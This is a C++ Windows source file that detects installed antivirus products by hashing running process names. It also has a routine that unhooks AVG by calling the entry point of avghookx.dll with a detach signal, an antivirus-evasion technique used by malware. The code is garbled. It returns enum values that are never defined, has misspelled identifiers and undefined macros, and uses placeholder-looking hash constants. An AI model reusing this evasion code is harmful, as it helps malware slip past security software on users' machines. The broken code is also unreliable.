#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <algorithm>

typedef unsigned int uint;

using namespace std;

namespace Str
{
    string Lower(const char *s)
    {
        string res(s);
        transform(res.begin(), res.end(), res.begin(), ::tolower);
        return res;
    }

    uint Hash(const string &str)
    {
        uint hash = 0;
        for (char c : str)
            hash = hash * 31 + c;
        return hash;
    }
}

enum AVType
{
    AV_None = 0,
    AV_TrendMicro = 1,
    AV_Kaspersky = 2,
    AV_Avast = 3,
    AV_Bitdefender = 4,
    AV_Norton = 5,
    AV_McAfee = 6
};

int DVDetect()
{
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return AV_None;

    if (Process32First(snap, &pe))
    {
        do
        {
            uint hash = Str::Hash(Str::Lower(pe.szExeFile));

            switch (hash)
            {
            case 0x0fc4e7c5:
                CloseHandle(snap);
                return AV_TrendMicro;
            case 0x1a2b3c4d:
                CloseHandle(snap);
                return AV_Kaspersky;
            case 0x2b3c4d5e:
                CloseHandle(snap);
                return AV_Avast;
            case 0x3c4d5e6f:
                CloseHandle(snap);
                return AV_Bitdefender;
            case 0x4d5e6f70:
                CloseHandle(snap);
                return AV_Norton;
            case 0x5e6f7081:
                CloseHandle(snap);
                return AV_McAfee;

            // Нові додані антивіруси:
            case 0x6f708192:
                CloseHandle(snap);
                return AV_ESET; // ESET NOD32 / Smart Security
            case 0x7f8192a3:
                CloseHandle(snap);
                return AV_WindowsDefender; // Microsoft Defender
            case 0x8f92a3b4:
                CloseHandle(snap);
                return AV_Sophos; // Sophos Antivirus
            case 0x9fa3b4c5:
                CloseHandle(snap);
                return AV_Panda; // Panda Security
            case 0xafb4c5d6:
                CloseHandle(snap);
                return AV_DrWeb; // Doctor Web
            case 0xbfc5d6e7:
                CloseHandle(snap);
                return AV_GData; // G Data Antivirus
            case 0xcfd6e7f8:
                CloseHandle(snap);
                return AV_Comodo; // Comodo Internet Security
            }

        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return AV_None;
}

int main()
{
    int av = DVDetect();

    switch (av)
    {
    case AV_TrendMicro:
        cout << "Trend Micro detected!\n";
        break;
    case AV_Kaspersky:
        cout << "Kaspersky detected!\n";
        break;
    case AV_Avast:
        cout << "Avast detected!\n";
        break;
    case AV_Bitdefender:
        cout << "Bitdefender detected!\n";
        break;
    case AV_Norton:
        cout << "Norton detected!\n";
        break;
    case AV_McAfee:
        cout << "McAfee detected!\n";
        break;
    default:
        cout << "No known AV detected.\n";
        break;
    }

    return 0;
}

bool AVGUnload()
{
    typedef BOOL(WINAPI * typeDllMain)(_In_ HINSTANCE hinstDLL,
                                       _In_ DWORD fdwReason, _In_ LPVOID lpvReserved);
    typedeDllMain DllMain;

    HINSTANCE dllAvg = API(KERNEL32, GetModuleHandleA)(_CS_("avghookx.dll"));
    if (dllAvg)
    {
        DbgMsg("found .dll");
        PIMAGE_NT_HEADERS ntHeaders = PE::GetNTHeaders(dllAvg);
        DWORD addrEP = (DWORD)allAvg + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        DllMain = (typeDllMain)addEP;
        DllMain(dllAvg, DLL_PROCESS_DETACH, NULL);
        return true;
    }
    else
        return false;
}